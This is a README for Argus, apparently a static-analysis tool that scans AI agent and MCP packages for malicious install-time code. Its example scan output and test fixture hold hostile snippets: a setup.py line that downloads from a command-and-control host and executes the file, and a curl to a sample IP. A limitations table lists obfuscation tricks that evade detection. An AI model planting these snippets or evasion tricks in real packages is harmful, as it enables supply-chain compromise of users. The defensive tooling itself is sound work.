# Argus

**Security gateway for AI agent and MCP package installation.**

Argus intercepts packages before they are installed and performs static analysis on their source code, catching malicious payloads that bypass manifest-level checks. If critical findings are present, installation is blocked and the user is prompted to confirm or abort.

---

## The Problem

Modern AI agent and MCP ecosystems encourage installing packages from the internet with a single command. Manifest checks (checksums, signatures) verify *authenticity* — they do not tell you what the code actually does. An attacker can publish a legitimate-looking package that exfiltrates credentials, opens a reverse shell, or executes a remote payload at install time. Argus closes that gap.

---

## Key Features

- **Go AST analysis** — precise call-site detection for dangerous Go APIs with no false positives from string matching; import aliases are resolved to full package paths
- **Regex + entropy scanning** — Python, JavaScript, TypeScript, and shell scripts scanned for dangerous patterns, hardcoded secrets, and high-entropy strings
- **Two severity tiers** — `CRITICAL` blocks installation with a prompt; `WARNING` is logged but non-blocking
- **Zip-slip protection** — archive extraction rejects path traversal attempts
- **Extraction size cap** — 100 MiB per-file ceiling on archive extraction guards against zip-bomb payloads; source files larger than 1 MiB are skipped during SAST scanning
- **CI-safe** — non-interactive sessions auto-decline critical findings and exit 1; no silent installs in pipelines
- **Zero external dependencies** — standard library only

---

## Installation

### Homebrew (recommended for macOS)

```bash
brew tap argusgate/tap
brew install argus
```

### Pre-built binary

Download the binary for your platform from the [releases page](https://github.com/argusgate/argus/releases) and place it on your `PATH`:

```bash
# macOS (Apple Silicon)
curl -fsSL -o argus https://github.com/argusgate/argus/releases/latest/download/argus-darwin-arm64
chmod +x argus && sudo mv argus /usr/local/bin/

# macOS (Intel)
curl -fsSL -o argus https://github.com/argusgate/argus/releases/latest/download/argus-darwin-amd64
chmod +x argus && sudo mv argus /usr/local/bin/

# Linux (x86_64)
curl -fsSL -o argus https://github.com/argusgate/argus/releases/latest/download/argus-linux-amd64
chmod +x argus && sudo mv argus /usr/local/bin/
```

### Build from source

Requires Go 1.22 or later.

```bash
git clone https://github.com/argusgate/argus.git
cd argus
go build -o argus ./cmd/argus/
sudo mv argus /usr/local/bin/
```

### go install

```bash
go install github.com/argusgate/argus/cmd/argus@latest
```

---

## GitHub Actions

Add Argus to any workflow to scan a package before installation:

```yaml
- name: Scan package with Argus
  uses: argusgate/argus@v0.1.0
  with:
    path: ./my-package
```

Critical findings fail the workflow (exit 1). Warnings are logged but non-blocking.

---

## Usage

```
argus scan <source>
```

`<source>` may be:

| Format | Example |
|--------|---------|
| Local directory | `argus scan ./my-package` |
| `.tar.gz` archive | `argus scan package-1.2.3.tar.gz` |
| `.zip` archive | `argus scan package-1.2.3.zip` |

Argus exits 0 when the scan is clean, 1 when critical findings are present. This makes it composable with any package manager:

```bash
argus scan ./my-package && pip install ./my-package
argus scan package.tar.gz && npm install
```

### Example — clean package

```
argus: running SAST scan on ./my-package
$
```

### Example — critical findings

```
argus: running SAST scan on suspicious-mcp-server.tar.gz

ARGUS SAST — 3 critical finding(s) in suspicious-mcp-server.tar.gz

  CRITICAL  setup.py:7    subprocess usage
            > subprocess.Popen(["curl", c2, "-o", "/tmp/.x"], shell=False)

  CRITICAL  setup.py:8    exec() usage
            > exec(open("/tmp/.x").read())

  CRITICAL  src/utils.py:4   OpenAI API key
            > SECRET_KEY = "sk-aBcDeFgHiJkLmNoPqRsTuVwXyZ123456789"

  WARNING   setup.py:6    raw IP address
  WARNING   src/utils.py:11   SSL certificate verification disabled

Scan anyway? [y/N]:
```

Type `y` to override or press Enter to abort. In non-interactive environments (CI/CD pipelines) the prompt is skipped and the process exits with code 1.

---

## Rule Coverage

### Go (AST-based)

| Rule | Calls Matched | Severity |
|------|--------------|----------|
| exec.Command usage | `exec.Command`, `exec.CommandContext` | CRITICAL |
| os.StartProcess usage | `os.StartProcess` | CRITICAL |
| syscall.Exec usage | `syscall.Exec`, `syscall.ForkExec` | CRITICAL |
| plugin.Open usage | `plugin.Open` | CRITICAL |
| unsafe package usage | Any selector on the `unsafe` package | CRITICAL |
| net.Dial usage | `net.Dial`, `net.DialContext`, `net.DialTCP`, `net.DialUDP` | WARNING |
| http outbound request | `http.Get`, `http.Post`, `http.PostForm`, `http.Head` | WARNING |

Import aliases are resolved to their full import path, so `import ex "os/exec"; ex.Command(...)` is caught identically to `exec.Command(...)`.

### Python

| Rule | Pattern | Severity |
|------|---------|----------|
| eval() usage | `eval(` | CRITICAL |
| exec() usage | `exec(` | CRITICAL |
| os.system() usage | `os.system(` | CRITICAL |
| subprocess usage | `subprocess.call/run/Popen(` | CRITICAL |
| pty.spawn() usage | `pty.spawn(` | CRITICAL |
| pickle deserialisation | `pickle.loads(`, `pickle.load(` | CRITICAL |
| unsafe yaml.load() | `yaml.load(` without `SafeLoader` | CRITICAL |
| Hardcoded secret | `password/secret/api_key/token = "..."` | CRITICAL |
| AWS access key | `AKIA...` | CRITICAL |
| GitHub PAT | `ghp_...` | CRITICAL |
| OpenAI API key | `sk-...` | CRITICAL |
| Dynamic import | `importlib.import_module(` | WARNING |
| SSL verification disabled | `verify=False` | WARNING |
| Raw IP address | Dotted-decimal address (public ranges only) | WARNING |

### Ruby (`.rb`, `.rake`, `.gemspec`)

| Rule | Pattern | Severity |
|------|---------|----------|
| eval() usage | `eval(` | CRITICAL |
| exec() usage | `exec(` | CRITICAL |
| system() usage | `system(` | CRITICAL |
| spawn() usage | `spawn(` | CRITICAL |
| IO.popen usage | `IO.popen(` | CRITICAL |
| Open3 usage | `Open3.popen*/capture*/pipeline` | CRITICAL |
| Marshal deserialisation | `Marshal.load(`, `Marshal.restore(` | CRITICAL |
| Unsafe YAML.load() | `YAML.load(` without `safe_load`/`permitted_classes` | CRITICAL |
| Backtick shell execution | `` `cmd` `` | CRITICAL |
| Shell execution via %x | `%x{cmd}` and variants | CRITICAL |
| Hardcoded secret | `password/secret/api_key/token = "..."` | CRITICAL |
| AWS access key | `AKIA...` | CRITICAL |
| GitHub PAT | `ghp_...` | CRITICAL |
| OpenAI API key | `sk-...` | CRITICAL |
| open() pipe | `open("\| cmd")` | WARNING |
| Dynamic dispatch via send() | `send(` | WARNING |
| SSL certificate verification disabled | `VERIFY_NONE` | WARNING |
| Raw IP address | Dotted-decimal address (public ranges only) | WARNING |

### Rust (`.rs`)

| Rule | Pattern | Severity |
|------|---------|----------|
| unsafe block | `unsafe {` | CRITICAL |
| process::Command usage | `Command::new(` | CRITICAL |
| Hardcoded secret | `password/secret/api_key/token = "..."` | CRITICAL |
| AWS access key | `AKIA...` | CRITICAL |
| GitHub PAT | `ghp_...` | CRITICAL |
| OpenAI API key | `sk-...` | CRITICAL |
| build.rs present | any `build.rs` file (Cargo compile-time execution) | WARNING |
| FFI extern block | `extern "C" {` | WARNING |
| File embedding macro | `include_bytes!(`, `include_str!(` | WARNING |
| Raw IP address | Dotted-decimal address (public ranges only) | WARNING |

`build.rs` is flagged unconditionally — Cargo executes it at compile time before installation completes, making it a compile-time code-execution vector regardless of content.

### JavaScript / TypeScript

| Rule | Pattern | Severity |
|------|---------|----------|
| eval() usage | `eval(` | CRITICAL |
| exec() usage | `exec(` | CRITICAL |
| child_process usage | `require('child_process')` | CRITICAL |
| new Function() usage | `new Function(` | CRITICAL |
| vm.runInNewContext() usage | `vm.runInNewContext(` | CRITICAL |
| Hardcoded secret | `password/secret/api_key/token = "..."` | CRITICAL |
| AWS access key | `AKIA...` | CRITICAL |
| GitHub PAT | `ghp_...` | CRITICAL |
| OpenAI API key | `sk-...` | CRITICAL |
| SSL verification disabled | `verify=false` | WARNING |
| Raw IP address | Dotted-decimal address (public ranges only) | WARNING |

### Shell (`.sh`, `.bash`)

| Rule | Pattern | Severity |
|------|---------|----------|
| eval usage | `eval ` | CRITICAL |
| exec usage | `exec ` | CRITICAL |
| Hardcoded secret | `password/secret/api_key/token=...` | CRITICAL |
| Raw IP address | Dotted-decimal address (public ranges only) | WARNING |

### All languages

| Rule | Detection | Severity |
|------|-----------|----------|
| High-entropy string | Shannon entropy ≥ 4.5 on assigned string literals longer than 20 characters (`x = "..."`) | WARNING |

Private and loopback IP ranges (RFC 1918, `127.x`, `10.x`, `192.168.x`, `172.16–31.x`) are excluded from the raw IP rule.

---

## Architecture

```
argus scan <source>
      │
      ├── 1. prepareWorkDir — extract archive to temp dir, or use directory as-is
      │       ├── expandNestedArchives — recursively unpacks .tar.gz/.zip (max 2 levels)
      │       └── sanitisePath — rejects zip-slip path traversal attempts
      │
      ├── 2. scanner.Scan(dir)
      │       │
      │       └── fs.WalkDir — for each recognised source file:
      │               ├── .go   → GoASTScanner
      │               │           ├── go/parser → AST walk
      │               │           └── on parse failure → RegexScanner fallback
      │               ├── .py   → RegexScanner (pyRules)
      │               ├── .js / .ts / .mjs → RegexScanner (jsRules)
      │               ├── .rb / .rake / .gemspec → RegexScanner (rubyRules)
      │               ├── .rs              → RustScanner (rustRules + build.rs flag)
      │               └── .sh / .bash      → RegexScanner (shellRules)
      │                           └── + high-entropy assignment pass on every file
      │
      ├── 3. printReport — CRITICAL findings to stderr with snippets
      │
      ├── 4. confirm (if HasCritical)
      │       ├── TTY     → prompt user [y/N]
      │       └── non-TTY → auto-decline, exit 1
      │
      └── 5. Exit 0 (clean) / Exit 1 (blocked)
             caller is responsible for invoking the package manager
```

### Project structure

```
argus/
├── cmd/
│   └── argus/
│       ├── scan.go          — CLI entry point, archive extraction, scan flow
│       └── scan_test.go     — integration tests
├── pkg/
│   └── scanner/
│       ├── sast.go          — Scanner interface, GoASTScanner, RegexScanner, Scan()
│       └── sast_test.go     — unit tests for all rules and edge cases
├── docs/
│   └── sast-design.md       — full design document including decision log
├── go.mod
├── LICENSE
└── README.md
```

### Key types

```go
type Severity string

const (
    Critical Severity = "CRITICAL"
    Warning  Severity = "WARNING"
)

type Finding struct {
    File     string   // path relative to scanned package root
    Line     int      // 1-based line number
    Rule     string   // human-readable rule name
    Snippet  string   // offending source line, trimmed
    Severity Severity
}

type Report struct {
    PackageDir  string
    Findings    []Finding
    HasCritical bool
}

type Scanner interface {
    Scan(path string, content []byte) ([]Finding, error)
}
```

---

## Development

### Prerequisites

- Go 1.22 or later

### Build

```bash
go build -o argus ./cmd/argus/
```

### Run tests

```bash
go test ./...
```

### Cross-compile for all platforms

```bash
GOOS=darwin  GOARCH=arm64  go build -o dist/argus-darwin-arm64   ./cmd/argus/
GOOS=darwin  GOARCH=amd64  go build -o dist/argus-darwin-amd64   ./cmd/argus/
GOOS=linux   GOARCH=amd64  go build -o dist/argus-linux-amd64    ./cmd/argus/
GOOS=linux   GOARCH=arm64  go build -o dist/argus-linux-arm64    ./cmd/argus/
GOOS=windows GOARCH=amd64  go build -o dist/argus-windows-amd64.exe ./cmd/argus/
```

### Test with a real package

```bash
# Happy path — scan a large, clean Python project
git clone https://github.com/pallets/flask /tmp/flask-test
./argus scan /tmp/flask-test

# Malicious fixture — mimics real supply chain attack patterns
mkdir -p /tmp/mal-pkg/src
echo 'import subprocess; subprocess.Popen(["curl","203.0.113.1"])' > /tmp/mal-pkg/setup.py
echo 'import pickle; pickle.loads(data)' > /tmp/mal-pkg/src/utils.py
./argus scan /tmp/mal-pkg
```

---

## Known Limitations (V2 roadmap)

The following evasion techniques are not caught by the current rule set. They are documented here to be explicit about coverage boundaries:

| Technique | Example |
|-----------|---------|
| String concatenation execution | `getattr(__builtins__, "ev"+"al")(x)` |
| `getattr` indirection | `getattr(os, 'sys'+'tem')(cmd)` |
| Unicode escape obfuscation | `\x65\x76\x61\x6c(payload)` |
| Split secret across variables | `k1="sk-abc"; k2="xyz"` |
Taint-flow analysis is required for reliable detection of these techniques.

---

## Contributing

Argus is open source under the AGPL v3 licence. Commercial use requires a separate licence — see [LICENSE](LICENSE).

Pull requests are welcome. Please include tests for any new rule or scanner behaviour. Run `go test ./...` before submitting.

---

## Licence

Copyright (C) 2026 Argus

This program is free software: you can redistribute it and/or modify it under the terms of the GNU Affero General Public Licence as published by the Free Software Foundation, either version 3 of the Licence, or (at your option) any later version.

For commercial use — including embedding Argus in proprietary products or offering it as a hosted service — a commercial licence is required. Open an issue or start a discussion in this repository.
